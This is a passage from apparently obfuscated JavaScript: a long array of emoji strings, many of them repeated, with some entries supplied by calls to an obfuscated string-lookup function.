'\ud83e\udd34', '\ud83d\udc79', '\ud83e\udd3a', '\ud83e\udd3b', '\ud83d\udc7a', '\ud83e\udd3c', '\ud83e\udd3d', '\ud83e\udd3e', '\ud83e\udd3f', '\ud83e\udd81', '\ud83d\udc34', '\ud83e\udd8a', '\ud83d\udc3a', '\ud83d\udc3c', '\ud83d\udc3e', '\ud83d\udc3f', '\ud83e\udd84', '\ud83e\udd85', '\ud83e\udd86', '\ud83e\udd87', '\ud83e\udd88', '\ud83d\udc33', '\ud83d\udc0b', '\ud83d\udc1f', '\ud83d\udc20', '\ud83d\udc21', '\ud83d\udc19', '\ud83d\udc1a', '\ud83d\udc1c', '\ud83d\udc1d', '\ud83d\udc1e', _0x1ed978(0xee), '\ud83e\udd8b', '\ud83d\udc1b', '\ud83d\udc0c', '\ud83d\udc1a', '\ud83c\udf3f', '\ud83c\udf38', '\ud83d\udc90', '\ud83c\udf39', '\ud83c\udf3a', '\ud83c\udf3b', '\ud83c\udf34', '\ud83c\udff5', '\ud83c\udff0', '\ud83c\udfe0', '\ud83c\udfe1', '\ud83c\udfe2', '\ud83c\udfe3', '\ud83c\udfe5', '\ud83c\udfe6', '\ud83c\udfe7', '\ud83c\udfe8', '\ud83c\udfe9', '\ud83c\udfea', '\ud83c\udfeb', '\ud83c\udfec', '\ud83c\udfed', '\ud83c\udfee', '\ud83c\udfef', '\ud83d\udea3', '\ud83d\udee5', '\ud83d\ude82', '\ud83d\ude81', '\ud83d\ude80', '\ud83d\udef8', '\ud83d\udef9', '\ud83d\udeb4', '\ud83d\udeb2', '\ud83d\udefa', '\ud83d\udeae', '\ud83d\udeaf', '\ud83d\udeb1', '\ud83d\udeab', '\ud83d\udebd', _0x1ed978(0xe3), '\ud83d\udca3', '\ud83d\udd2b', _0x1ed978(0xee), _0x1ed978('\x30\x78\x32\x38\x36'), '\ud83d\udc80', '\ud83d\udc7b', '\ud83d\udd7a', '\ud83d\udc83', _0x1ed978('\x30\x78\x31\x36\x64'), '\ud83d\udc76', '\ud83d\udc75', '\ud83d\udc74', '\ud83d\udc71', '\ud83d\udc68', '\ud83d\udc69', '\ud83d\udc67', '\ud83d\udc66', '\ud83d\udc6a', '\ud83d\ude42', '\ud83d\ude11', '\ud83e\udd23', '\ud83d\ude0d', '\ud83d\ude18', '\ud83d\ude17', '\ud83d\ude19', '\ud83d\ude1a', '\ud83d\ude1b', '\ud83d\ude1d', '\ud83d\ude1e', '\ud83d\ude1f', '\ud83d\ude20', '\ud83d\ude21', '\ud83d\ude22', '\ud83d\ude2d', '\ud83d\ude13', '\ud83d\ude33', '\ud83d\ude34', '\ud83d\ude0c', '\ud83d\ude06', '\ud83d\ude02', '\ud83e\udd14', '\ud83d\ude12', '\ud83d\ude13', '\ud83d\ude36', '\ud83d\ude44', '\ud83d\udc36', '\ud83d\udc31', '\ud83d\udc14', '\ud83d\udc37', '\ud83d\udc34', '\ud83d\udc32', '\ud83d\udc38', '\ud83d\udc33', '\ud83d\udc0b', '\ud83d\udc12', '\ud83d\udc11', '\ud83d\udc15', '\ud83d\udc29', '\ud83c\udf54', '\ud83c\udf55', '\ud83e\udd64', '\ud83c\udf63', '\ud83c\udf72', '\ud83c\udf74', '\ud83c\udf7d', '\ud83c\udf79', '\ud83c\udf78', '\ud83c\udf82', '\ud83d\udcf1', '\ud83d\udcfa', '\ud83d\udcfb', '\ud83c\udfa4', '\ud83d\udcda', '\ud83d\udcbb', '\ud83d\udcf8', '\ud83d\udcf7', '\u2764\ufe0f', '\ud83d\udc94', '\u2763\ufe0f', '\u2600\ufe0f', '\ud83c\udf19', '\ud83c\udf03', '\ud83c\udfe0', '\ud83d\udeaa', _0x1ed978(0xe1), _0x1ed978(0x10f), _0x1ed978(0x28f), '\ud83c\udde6\ud83c\uddfa', _0x1ed978('\x30\x78\x31\x64\x33'), _0x1ed978('\x30\x78\x31\x37\x30'), _0x1ed978('\x30\x78\x31\x32\x62'), '\ud83d\udc4d', '\ud83d\udc4e', '\ud83d\udc4f', '\ud83d\udc6b', '\ud83d\udc6d', '\ud83d\udc6c', '\ud83d\udc6e', '\ud83e\udd1d', '\ud83d\ude4f', '\ud83d\udc51', '\ud83c\udf3b', '\ud83c\udf3a', '\ud83c\udf38', '\ud83c\udf39', '\ud83c\udf34', '\ud83c\udfde\ufe0f', '\ud83c\udf0a', '\ud83d\ude97', '\ud83d\ude8c', '\ud83d\udee3\ufe0f', '\ud83d\udeeb\ufe0f', '\ud83d\udeec\ufe0f', '\ud83d\udea3', '\ud83d\udee5', '\ud83d\ude82', '\ud83d\ude81', '\ud83d\ude80', _0x1ed978(0x1f7), _0x1ed978(0x146), _0x1ed978('\x30\x78\x32\x36\x34'), _0x1ed978('\x30\x78\x31\x31\x61'), '\ud83c\udfbe', '\ud83c\udfc0', '\ud83c\udfc8', '\ud83c\udfaf', '\ud83c\udfc6', '\x3f\x3f', '\u2b06\ufe0f', '\u2b07\ufe0f', '\u21d2', '\u21d0', '\u21a9\ufe0f', '\u21aa\ufe0f', '\u2139\ufe0f', '\u203c\ufe0f', '\u2049\ufe0f', '\u203d\ufe0f', '\u00a9\ufe0f', '\u00ae\ufe0f', '\u2122\ufe0f', '\ud83d\udd34', '\ud83d\udd35', '\ud83d\udfe2', '\ud83d\udd39', '\ud83d\udd3a', '\ud83d\udcaf', '\ud83d\udc51', '\ud83e\udd23', _0x1ed978(0x255), _0x1ed978('\x30\x78\x31\x66\x30'), _0x1ed978(0x295), '\ud83d\ude45\u200d\u2640\ufe0f', '\ud83d\ude46\u200d\u2642\ufe0f', _0x1ed978('\x30\x78\x32\x37\x33'), '\ud83e\udd26\u200d\u2642\ufe0f', _0x1ed978(0x1ce), '\ud83c\udffb', _0x1ed978('\x30\x78\x31\x30\x65'), '\ud83d\udc86\u200d\u2640\ufe0f', '\ud83d\udd74\u200d\u2642\ufe0f', _0x1ed978(0x19c), '\ud83d\udc87\u200d\u2642\ufe0f', _0x1ed978(0x25e), '\ud83d\udeab', '\ud83d\udebd', _0x1ed978('\x30\x78\x65\x33'), '\ud83d\udca3', '\ud83d\udd2b', _0x1ed978(0xee), _0x1ed978(0x286), '\ud83d\udc80', '\ud83d\udc7b', '\ud83d\udd7a', '\ud83d\udc83', _0x1ed978('\x30\x78\x31\x36\x64'), '\ud83d\udc76', '\ud83d\udc75', '\ud83d\udc74', '\ud83d\udc71', '\ud83d\udc68', '\ud83d\udc69', '\ud83d\udc67', '\ud83d\udc66', '\ud83d\udc6a', '\ud83d\udc6b', '\ud83d\udc6d', '\ud83d\udc6c', '\ud83d\udc6e', _0x1ed978('\x30\x78\x31\x36\x64'), '\ud83d\udcbc', '\ud83d\udcca', '\ud83d\udcc8', '\ud83d\udcc9', '\ud83d\udcca', '\ud83d\udcdd', '\ud83d\udcda', '\ud83d\udcf0', '\ud83d\udcf1', '\ud83d\udcbb', '\ud83d\udcfb', '\ud83d\udcfa', '\ud83c\udfac', _0x1ed978('\x30\x78\x32\x33\x39'), '\ud83d\udcf8', '\ud83d\udcf7', '\ud83d\udd6f\ufe0f', '\ud83d\udca1', '\ud83d\udd26', '\ufffd', '\ud83c\udfef', '\ud83c\udff0', '\ud83c\udfe0', '\ud83c\udfe1', '\ud83c\udfe2', '\ud83c\udfe3', '\ud83c\udfe5', '\ud83c\udfe6', '\ud83c\udfe7', '\ud83c\udfe8', '\ud83c\udfe9', '\ud83c\udfea', '\ud83c\udfeb', '\ud83c\udfec', '\ud83c\udfed', '\ud83c\udfee', '\ud83c\udfef', '\ud83d\udea3', '\ud83d\udee5', '\ud83d\ude82', '\ud83d\ude81', '\ud83d\ude80', '\ud83d\udef8', '\ud83d\udef9', '\ud83d\udeb4', '\ud83d\udeb2', '\ud83d\udefa', '\ud83d\udeae', '\ud83d\udeaf', '\ud83d\udeb1', '\ud83d\udeab', '\ud83d\udebd', _0x1ed978('\x30\x78\x65\x33'), '\ud83d\udca3', '\ud83d\udd2b', _0x1ed978('\x30\x78\x65\x65'), '\ud83d\udd78\ufe0f', '\ud83d\udc80', '\ud83d\udc7b', '\ud83d\udd7a', '\ud83d\udc83', '\ud83d\udd74\ufe0f', '\ud83d\udc76', '\ud83d\udc75', '\ud83d\udc74', '\ud83d\udc71', '\ud83d\udc68', '\ud83d\udc69', '\ud83d\udc67', '\ud83d\udc66', '\ud83d\udc6a', '\ud83d\udc6b', '\ud83d\udc6d', '\ud83d\udc6c', '\ud83d\udc6e', _0x1ed978(0x16d), '\ud83d\udcbc', '\ud83d\udcca', '\ud83d\udcc8', '\ud83d\udcc9', '\ud83d\udcca', '\ud83d\udcdd', '\ud83d\udcda', '\ud83d\udcf0', '\ud83d\udcf1', '\ud83d\udcbb', '\ud83d\udcfb', '\ud83d\udcfa', '\ud83c\udfac', '\ud83d\udcfd\ufe0f', '\ud83d\udcf8', '\ud83d\udcf7', _0x1ed978(0x127), '\ud83d\udca1', '\ud83d\udd26', '\ud83d\udd27', '\ud83d\udd28', '\ud83d\udd29', '\ud83d\udd2a', '\ud83d\udd2b', '\ud83d\udc51', '\ud83d\udc51', '\ud83d\udc78', '\ud83e\udd34', '\ud83d\udc79', '\ud83e\udd3a', '\ud83e\udd3b', '\ud83d\udc7a', '\ud83e\udd3c', '\ud83e\udd3d', '\ud83e\udd3e', '\ud83e\udd3f', '\ud83e\udd81', '\ud83d\udc34', '\ud83e\udd8a', '\ud83d\udc3a', '\ud83d\udc3c', '\ud83d\udc3e', '\ud83d\udc3f', '\ud83e\udd84', '\ud83e\udd85', '\ud83e\udd86', '\ud83e\udd87', '\ud83e\udd88', '\ud83d\udc33', '\ud83d\udc0b', '\ud83d\udc1f', '\ud83d\udc20', '\ud83d\udc21', '\ud83d\udc19', '\ud83d\udc1a', '\ud83d\udc1c', '\ud83d\udc1d', '\ud83d\udc1e', _0x1ed978(0xee), '\ud83e\udd8b', '\ud83d\udc1b', '\ud83d\udc0c', '\ud83d\udc1a', '\ud83c\udf3f', '\ud83c\udf38', '\ud83d\udc90', '\ud83c\udf39', '\ud83c\udf3a', '\ud83c\udf3b', '\ud83c\udf34', '\ud83c\udf33', '\ud83c\udf32', '\ud83c\udf3e', '\ud83c\udf3f', '\ud83c\udf43', '\ud83c\udf42', '\ud83c\udf43', '\ud83c\udf3b', '\ud83d\udc90', '\ud83c\udf39', '\ud83c\udf3a', '\ud83c\udf38', '\ud83c\udf34', '\ud83c\udff5', '\ud83c\udf80', '\ud83c\udfc6', '\ud83c\udfc8', '\ud83c\udfc9', '\ud83c\udfaf', '\ud83c\udfc0', '\ud83c\udfca', '\ud83c\udfcb', '\ud83c\udfcc', '\ud83c\udfb2', '\ud83d\udcda', '\ud83d\udcd6', '\ud83d\udcdc', '\ud83d\udcdd', '\ud83d\udcad', '\ud83d\udcac', '\ud83d\udde3', '\ud83d\udcab', '\ud83c\udf1f', '\ud83c\udf20', '\ud83c\udf89', '\ud83c\udf8a', '\ud83d\udc4f', '\ud83d\udca5', '\ud83d\udd25', '\ud83d\udca5', '\ud83c\udf2a', '\ud83d\udca8', '\ud83c\udf2b', '\ud83c\udf2c', '\ud83c\udf29', '\ud83c\udf28', '\ud83c\udf27', '\ud83c\udf26', '\ud83c\udf25', '\ud83c\udf21', '\ud83c\udf2a', '\ud83c\udf2b', '\ud83c\udf2c', '\ud83c\udf29', '\ud83c\udf28', '\ud83c\udf27', '\ud83c\udf26', '\ud83c\udf25', '\ud83c\udf21', '\ud83c\udf2a', '\ud83c\udf2b', '\ud83c\udf2c', '\ud83c\udf29', '\ud83c\udf28', '\ud83c\udf27', '\ud83c\udf26', '\ud83c\udf25', '\ud83c\udf21', '\ud83c\udf31', '\ud83c\udf3f', '\ud83c\udf43', '\ud83c\udf42', '\ud83c\udf3b', '\ud83d\udc90', '\ud83c\udf39', '\ud83c\udf3a', '\ud83c\udf38', '\ud83c\udf34', '\ud83c\udff5', '\ud83c\udf80', '\ud83c\udfc6', '\ud83c\udfc8', '\ud83c\udfc9', '\ud83c\udfaf', '\ud83c\udfc0', '\ud83c\udfca', '\ud83c\udfcb', '\ud83c\udfcc', '\ud83c\udfb2', '\ud83d\udcda', '\ud83d\udcd6', '\ud83d\udcdc', '\ud83d\udcdd', '\ud83d\udcad', '\ud83d\udcac', '\ud83d\udde3', '\ud83d\udcab', '\ud83c\udf1f', '\ud83c\udf20', '\ud83c\udf89', '\ud83c\udf8a', '\ud83d\udc4f', '\ud83d\udca5', '\ud83d\udd25', '\ud83d\udca5', '\ud83c\udf2a', '\ud83d\udca8', '\ud83c\udf2b', '\ud83c\udf2c', '\ud83c\udf29', '\ud83c\udf28', '\ud83c\udf27', '\ud83c\udf26', '\ud83c\udf25', '\ud83c\udf21', '\ud83c\udf2a', '\ud83c\udf2b', '\ud83c\udf2c', '\ud83c\udf29', '\ud83c\udf28', '\ud83c\udf27', '\ud83c\udf26', '\ud83c\udf25', '\ud83c\udf21', _0x1ed978('\x30\x78\x31\x32\x37'), '\ud83d\udca1', '\ud83d\udd26', '\ud83d\udd27', '\ud83d\udd28', '\ud83d\udd29', '\ud83d\udd2a', '\ud83d\udd2b', '\ud83d\udc51', '\ud83d\udc78', '\ud83e\udd34', '\ud83d\udc79', '\ud83e\udd3a', '\ud83e\udd3b', '\ud83d\udc7a', '\ud83e\udd3c', '\ud83e\udd3d', '\ud83e\udd3e', '\ud83e\udd3f', '\ud83e\udd81', '\ud83d\udc34', '\ud83e\udd8a', '\ud83d\udc3a', '\ud83d\udc3c', '\ud83d\udc3e', '\ud83d\udc3f', '\ud83e\udd84', '\ud83e\udd85', '\ud83e\udd86', '\ud83e\udd87', '\ud83e\udd88', '\ud83d\udc33', '\ud83d\udc0b', '\ud83d\udc1f', '\ud83d\udc20', '\ud83d\udc21', '\ud83d\udc19', '\ud83d\udc1a', '\ud83d\udc1c', '\ud83d\udc1d', '\ud83d\udc1e', '\ud83d\udd77\ufe0f', '\ud83e\udd8b', '\ud83d\udc1b', '\ud83d\udc0c', '\ud83d\udc1a', '\ud83c\udf3f', '\ud83c\udf38', '\ud83d\udc90', '\ud83c\udf39', '\ud83c\udf3a', '\ud83c\udf3b', '\ud83c\udf34', '\ud83c\udff5', '\ud83c\udff0', '\ud83c\udfe0', '\ud83c\udfe1', '\ud83c\udfe2', '\ud83c\udfe3', '\ud83c\udfe5', '\ud83c\udfe6', '\ud83c\udfe7', '\ud83c\udfe8', '\ud83c\udfe9', '\ud83c\udfea', '\ud83c\udfeb', '\ud83c\udfec', '\ud83c\udfed', '\ud83c\udfee', '\ud83c\udfef', '\ud83d\udea3', '\ud83d\udee5', '\ud83d\ude82', '\ud83d\ude81', '\ud83d\ude80', '\ud83d\udef8', '\ud83d\udef9', '\ud83d\udeb4', '\ud83d\udeb2', '\ud83d\udefa', '\ud83d\udeae', '\ud83d\udeaf', '\ud83d\udeb1', '\ud83d\udeab', '\ud83d\udebd', _0x1ed978('\x30\x78\x65\x33'), '\ud83d\udca3', '\ud83d\udd2b', _0x1ed978(0xee), '\ud83d\udd78\ufe0f', '\ud83d\udc80', '\ud83d\udc7b', '\ud83d\udd7a', '\ud83d\udc83', '\ud83d\udd74\ufe0f', '\ud83d\udc76', '\ud83d\udc75', '\ud83d\udc74', '\ud83d\udc71', '\ud83d\udc68', '\ud83d\udc69', '\ud83d\udc67', '\ud83d\udc66', '\ud83d\udc6a', '\ud83d\udc6b', '\ud83d\udc6d', '\ud83d\udc6c', '\ud83d\udc6e', _0x1ed978(0x16d), '\ud83d\udcbc', '\ud83d\udcca', '\ud83d\udcc8', '\ud83d\udcc9', '\ud83d\udcca', '\ud83d\udcdd', '\ud83d\udcda', '\ud83d\udcf0', '\ud83d\udcf1', '\ud83d\udcbb', '\ud83d\udcfb', '\ud83d\udcfa', '\ud83c\udfac', _0x1ed978(0x239), '\ud83d\udcf8', '\ud83d\udcf7', _0x1ed978(0x127), '\ud83d\udca1', '\ud83d\udd26', '\ud83d\udd27', '\ud83d\udd28', '\ud83d\udd29', '\ud83d\udd2a', '\ud83d\udd2b', '\ud83d\udc51', '\ud83d\udc78', '\ud83e\udd34', '\ud83d\udc79', '\ud83e\udd3a', '\ud83e\udd3b', '\ud83d\udc7a', '\ud83e\udd3c', '\ud83e\udd3d', '\ud83e\udd3e', '\ud83e\udd3f', '\ud83e\udd81', '\ud83d\udc34', '\ud83e\udd8a', '\ud83d\udc3a', '\ud83d\udc3c', '\ud83d\udc3e', '\ud83d\udc3f', '\ud83e\udd84', '\ud83e\udd85', '\ud83e\udd86', '\ud83e\udd87', '\ud83e\udd88', '\ud83d\udc33', '\ud83d\udc0b', '\ud83d\udc1f', '\ud83d\udc20', '\ud83d\udc21', '\ud83d\udc19', '\ud83d\udc1a', '\ud83d\udc1c', '\ud83d\udc1d', '\ud83d\udc1e', _0x1ed978(0xee), '\ud83e\udd8b', '\ud83d\udc1b', '\ud83d\udc0c', '\ud83d\udc1a', '\ud83c\udf3f', '\ud83c\udf38', '\ud83d\udc90', '\ud83c\udf39', '\ud83c\udf3a', '\ud83c\udf3b', '\ud83c\udf34', '\ud83c\udff5', '\ud83c\udff0', '\ud83d\udc12', '\ud83e\udd8d', '\ud83e\udda7', '\ud83d\udc36', '\ud83d\udc15', '\ud83e\uddae', _0x1ed978('\x30\x78\x31\x64\x30'), '\ud83d\udc29', '\ud83d\udc3a', '\ud83e\udd8a', '\ud83e\udd9d', '\ud83d\udc31', '\ud83d\udc08', _0x1ed978(0x298), '\ud83e\udd81', '\ud83d\udc2f', '\ud83d\udc05', '\ud83d\udc06', '\ud83d\udc34', '\ud83d\udc0e', '\ud83e\udd84', '\ud83e\udd93', '\ud83e\udd8c', '\ud83e\uddac', '\ud83d\udc2e', '\ud83d\udc02', '\ud83d\udc03', '\ud83d\udc04', '\ud83d\udc37', '\ud83d\udc16', '\ud83d\udc17', '\ud83d\udc3d', '\ud83d\udc0f', '\ud83d\udc11', '\ud83d\udc10', '\ud83d\udc2a', '\ud83d\udc2b', '\ud83e\udd99', '\ud83e\udd92', '\ud83d\udc18', '\ud83e\udda3', '\ud83e\udd8f', '\ud83e\udd9b', '\ud83d\udc2d', '\ud83d\udc01', '\ud83d\udc00', '\ud83d\udc39', '\ud83d\udc30', '\ud83d\udc07', _0x1ed978(0x187), '\ud83e\uddab', '\ud83e\udd94', '\ud83e\udd87', '\ud83d\udc3b', _0x1ed978('\x30\x78\x31\x34\x31'), '\ud83d\udc28', '\ud83d\udc3c', '\ud83e\udda5', '\ud83e\udda6', '\ud83e\udda8', '\ud83e\udd98', '\ud83e\udda1', '\ud83d\udc3e', '\ud83e\udd83', '\ud83d\udc14', '\ud83d\udc13', '\ud83d\udc23', '\ud83d\udc24', '\ud83d\udc25', '\ud83d\udc26', '\ud83d\udc27', _0x1ed978(0x1ad), '\ud83e\udd85', '\ud83e\udd86', '\ud83e\udda2', '\ud83e\udd89', '\ud83e\udda4', '\ud83e\udeb6', '\ud83e\udda9', '\ud83e\udd9a', '\ud83e\udd9c', '\ud83d\udc38', '\ud83d\udc0a', '\ud83d\udc22', '\ud83e\udd8e', '\ud83d\udc0d', '\ud83d\udc32', '\ud83d\udc09', '\ud83e\udd95', '\ud83e\udd96', '\ud83d\udc33', '\ud83d\udc0b', '\ud83d\udc2c', '\ud83e\uddad', '\ud83d\udc1f', '\ud83d\udc20', '\ud83d\ude00', '\ud83d\ude03', '\ud83d\ude04', '\ud83d\ude01', '\ud83d\ude06', '\ud83d\ude05', '\ud83e\udd23', '\ud83d\ude02', '\ud83d\ude42', '\ud83d\ude43', '\ud83d\ude09', '\ud83d\ude0a', '\ud83d\ude07', '\ud83e\udd70', '\ud83d\ude0d', '\ud83e\udd29', '\ud83d\ude18', '\ud83d\ude17', '\u263a\ufe0f', '\ud83d\ude1a', '\ud83d\ude19', '\ud83e\udd72', '\ud83d\ude0b', '\ud83d\ude1b', '\ud83d\ude1c', '\ud83e\udd2a', '\ud83d\ude1d', '\ud83e\udd11', '\ud83e\udd17', '\ud83e\udd2d', '\ud83e\udd2b', '\ud83e\udd14', '\ud83e\udd10', '\ud83e\udd28', '\ud83d\ude10', '\ud83d\ude11', '\ud83d\ude36', '\ud83d\ude36\u200d\ud83c\udf2b\ufe0f', '\ud83d\ude0f', '\ud83d\ude12', '\ud83d\ude44', '\ud83d\ude2c', _0x1ed978('\x30\x78\x31\x65\x30'), '\ud83e\udd25', '\ud83d\ude0c', '\ud83d\ude14', '\ud83d\ude2a', '\ud83e\udd24', '\ud83d\ude34', '\ud83d\ude37', '\ud83e\udd12', '\ud83e\udd15', '\ud83e\udd22', '\ud83e\udd2e', '\ud83e\udd27', '\ud83e\udd75', '\ud83e\udd76', '\ud83e\udd74', '\ud83d\ude35', '\ud83d\ude35\u200d\ud83d\udcab', '\ud83e\udd2f', '\ud83e\udd20', '\ud83e\udd73', '\ud83e\udd78', '\ud83d\ude0e', '\ud83e\udd13', '\ud83e\uddd0', '\ud83d\ude15', '\ud83d\ude1f', '\ud83d\ude41', '\u2639\ufe0f', '\ud83d\ude2e', '\ud83d\ude2f', '\ud83d\ude32', '\ud83d\ude33', '\ud83e\udd7a', '\ud83d\ude26', '\ud83d\ude27', '\ud83d\ude28', '\ud83d\ude30', '\ud83d\ude25', '\ud83d\ude22', '\ud83d\ude2d', '\ud83d\ude31', '\ud83d\ude16', '\ud83d\ude23', '\ud83d\ude1e', '\ud83d\ude13', '\ud83d\ude29', '\ud83d\ude2b', '\ud83e\udd71', '\ud83d\ude24', '\ud83d\ude21', '\ud83d\ude20', '\ud83e\udd2c', '\ud83d\ude08', '\ud83d\udc7f', '\ud83d\udc80', '\u2620\ufe0f', '\ud83d\udca9', '\ud83e\udd21', '\ud83d\udc79', '\ud83d\udc7a', '\ud83d\udc7b', '\ud83d\udc7d', '\ud83d\udc7e', '\ud83e\udd16', '\ud83d\ude3a', '\ud83d\ude38', '\ud83d\ude39', '\ud83d\ude3b', '\ud83d\ude3c', '\ud83d\ude3d', '\ud83d\ude40', '\ud83d\ude3f', '\ud83d\ude3e', '\ud83d\ude48', '\ud83d\ude49', '\ud83d\ude4a', '\ud83d\udc8b', '\ud83d\udc8c', '\ud83d\udc98', '\ud83d\udc9d', '\ud83d\udc96', '\ud83d\udc97', '\ud83d\udc93', '\ud83d\udc9e', '\ud83d\udc95', '\ud83d\udc9f', '\u2763\ufe0f', '\ud83d\udc94', _0x1ed978(0x1fa), _0x1ed978(0x24e), '\u2764\ufe0f', '\ud83e\udde1', '\ud83d\udc9b', '\ud83d\udc9a', '\ud83d\udc99', '\ud83d\udc9c', '\ud83e\udd0e', '\ud83d\udda4', '\ud83e\udd0d', '\ud83d\udcaf', '\ud83d\udca2', '\ud83d\udca5', '\ud83d\udcab', '\ud83d\udca6', '\ud83d\udca8', _0x1ed978('\x30\x78\x65\x33'), '\ud83d\udca3', '\ud83d\udcac', _0x1ed978('\x30\x78\x66\x64'), '\ud83d\udde8\ufe0f', _0x1ed978('\x30\x78\x31\x61\x66'), '\ud83d\udcad', '\ud83d\udca4', '\ud83d\udc4b', '\ud83e\udd1a', _0x1ed978('\x30\x78\x32\x32\x36'), '\u270b', '\ud83d\udd96', '\ud83d\udc4c', '\ud83e\udd0c', '\ud83e\udd0f', '\u270c\ufe0f', '\ud83e\udd1e', '\ud83e\udd1f', '\ud83e\udd18', '\ud83e\udd19', '\ud83d\udc48', '\ud83d\udc49', '\ud83d\udc46', '\ud83d\udd95', '\ud83d\udc47', '\u261d\ufe0f', '\ud83d\udc4d', '\ud83d\udc4e', '\u270a', '\ud83d\udc4a', '\ud83e\udd1b', '\ud83e\udd1c', '\ud83d\udc4f', '\ud83d\ude4c', '\ud83d\udc50', '\ud83e\udd32', '\ud83e\udd1d', '\ud83d\ude4f', '\u270d\ufe0f', '\ud83d\udc85', '\ud83e\udd33', '\ud83d\udcaa', '\ud83e\uddbe', '\ud83e\uddbf', '\ud83e\uddb5', '\ud83e\uddb6', '\ud83d\udc42', '\ud83e\uddbb', '\ud83d\udc43', '\ud83e\udde0', '\ud83e\udec0', '\ud83e\udec1', '\ud83e\uddb7', '\ud83e\uddb4', '\ud83d\udc40', _0x1ed978(0x1ba), '\ud83d\udc45', '\ud83d\udc44', '\ud83d\udc76', '\ud83e\uddd2', '\ud83d\udc66', '\ud83d\udc67', '\ud83e\uddd1', '\ud83d\udc71', '\ud83d\udc68', '\ud83e\uddd4', _0x1ed978('\x30\x78\x31\x33\x31'), '\ud83e\uddd4\u200d\u2640\ufe0f', _0x1ed978('\x30\x78\x32\x38\x63'), _0x1ed978('\x30\x78\x66\x61'), _0x1ed978(0x209), _0x1ed978('\x30\x78\x32\x30\x32'), '\ud83d\udc69', '\ud83d\udc69\u200d\ud83e\uddb0', '\ud83e\uddd1\u200d\ud83e\uddb0', '\ud83d\udc69\u200d\ud83e\uddb1', _0x1ed978(0xeb), _0x1ed978(0x1a5), _0x1ed978(0xe4), '\ud83d\udc69\u200d\ud83e\uddb2', _0x1ed978(0x1dd), '\ud83d\udc71\u200d\u2640\ufe0f', _0x1ed978('\x30\x78\x31\x65\x63'), '\ud83e\uddd3', '\ud83d\udc74', '\ud83d\udc75', '\ud83d\ude4d', '\ud83d\ude4d\u200d\u2642\ufe0f', _0x1ed978(0x22b), '\ud83d\ude4e', '\ud83d\ude4e\u200d\u2642\ufe0f', '\ud83d\ude4e\u200d\u2640\ufe0f', '\ud83d\ude45', _0x1ed978(0x295), _0x1ed978(0x13d), '\ud83d\ude46', _0x1ed978('\x30\x78\x31\x35\x64'), _0x1ed978(0x273), '\ud83d\udc81', _0x1ed978(0x297), _0x1ed978(0x104), '\ud83d\ude4b', _0x1ed978(0x128), _0x1ed978('\x30\x78\x31\x34\x62'), '\ud83e\uddcf', _0x1ed978('\x30\x78\x31\x61\x32'), '\ud83e\uddcf\u200d\u2640\ufe0f', '\ud83d\ude47', _0x1ed978('\x30\x78\x65\x64'), '\ud83d\ude47\u200d\u2640\ufe0f', '\ud83e\udd26', _0x1ed978('\x30\x78\x31\x39\x30'), _0x1ed978('\x30\x78\x31\x63\x65'), '\ud83e\udd37', _0x1ed978(0x255), '\ud83e\udd37\u200d\u2640\ufe0f', _0x1ed978(0x1cc), '\ud83d\udc68\u200d\u2695\ufe0f', _0x1ed978(0x12f), _0x1ed978('\x30\x78\x31\x33\x37'), _0x1ed978('\x30\x78\x31\x33\x36'), _0x1ed978(0x27d), _0x1ed978(0x206), '\ud83d\udc68\u200d\ud83c\udfeb', _0x1ed978(0x253), _0x1ed978('\x30\x78\x31\x32\x63'), _0x1ed978(0x117), _0x1ed978('\x30\x78\x31\x36\x30'), _0x1ed978('\x30\x78\x31\x37\x33'), _0x1ed978(0x243), _0x1ed978('\x30\x78\x31\x61\x38'), '\ud83e\uddd1\u200d\ud83c\udf73', '\ud83d\udc68\u200d\ud83c\udf73', _0x1ed978('\x30\x78\x31\x38\x36'), _0x1ed978(0x18d), _0x1ed978('\x30\x78\x31\x37\x65'), _0x1ed978(0x213), _0x1ed978('\x30\x78\x32\x35\x64'), _0x1ed978(0x230), _0x1ed978('\x30\x78\x31\x63\x39'), _0x1ed978(0x1e5), _0x1ed978(0x126), _0x1ed978(0x1e1), _0x1ed978('\x30\x78\x31\x34\x64'), _0x1ed978('\x30\x78\x31\x38\x30'), _0x1ed978('\x30\x78\x31\x33\x66'), '\ud83e\uddd1\u200d\ud83d\udcbb', _0x1ed978('\x30\x78\x31\x31\x36'), _0x1ed978(0x284), _0x1ed978('\x30\x78\x31\x35\x32'), _0x1ed978('\x30\x78\x32\x35\x30'), _0x1ed978(0x145), _0x1ed978('\x30\x78\x31\x36\x33'), _0x1ed978('\x30\x78\x31\x34\x61'), _0x1ed978(0x172), '\ud83e\uddd1\u200d\u2708\ufe0f', '\ud83d\udc68\u200d\u2708\ufe0f', _0x1ed978(0x216), '\ud83e\uddd1\u200d\ud83d\ude80', _0x1ed978(0xe8), _0x1ed978('\x30\x78\x31\x30\x39'), _0x1ed978('\x30\x78\x32\x31\x64'), '\ud83d\udc68\u200d\ud83d\ude92', _0x1ed978('\x30\x78\x31\x36\x31'), '\ud83d\udc6e', _0x1ed978('\x30\x78\x32\x35\x38'), _0x1ed978(0x200), '\ud83d\udd75\ufe0f', _0x1ed978('\x30\x78\x31\x35\x34'), _0x1ed978('\x30\x78\x31\x61\x33'), '\ud83d\udc82', '\ud83d\udc82\u200d\u2642\ufe0f', _0x1ed978('\x30\x78\x31\x64\x39'), '\ud83e\udd77', '\ud83d\udc77', _0x1ed978(0x1aa), _0x1ed978('\x30\x78\x31\x35\x39'), '\ud83e\udd34', '\ud83d\udc78', '\ud83d\udc73', _0x1ed978('\x30\x78\x32\x37\x62'), '\ud83d\udc73\u200d\u2640\ufe0f', '\ud83d\udc72', '\ud83e\uddd5', '\ud83e\udd35', _0x1ed978(0x262), _0x1ed978(0x1dc), '\ud83d\udc70', _0x1ed978('\x30\x78\x32\x34\x62'), _0x1ed978('\x30\x78\x31\x63\x33'), '\ud83e\udd30', '\ud83e\udd31', '\ud83d\udc69\u200d\ud83c\udf7c', '\ud83d\udc68\u200d\ud83c\udf7c', _0x1ed978('\x30\x78\x31\x64\x31'), '\ud83d\udc7c', '\ud83c\udf85', '\ud83e\udd36', _0x1ed978(0x1b4), '\ud83e\uddb8', '\ud83e\uddb8\u200d\u2642\ufe0f', _0x1ed978('\x30\x78\x31\x30\x32'), '\ud83e\uddb9', '\ud83e\uddb9\u200d\u2642\ufe0f', _0x1ed978('\x30\x78\x32\x33\x35'), '\ud83e\uddd9', _0x1ed978('\x30\x78\x31\x61\x31'), '\ud83e\uddd9\u200d\u2640\ufe0f', '\ud83e\uddda', _0x1ed978('\x30\x78\x32\x35\x66'), _0x1ed978('\x30\x78\x31\x65\x32'), 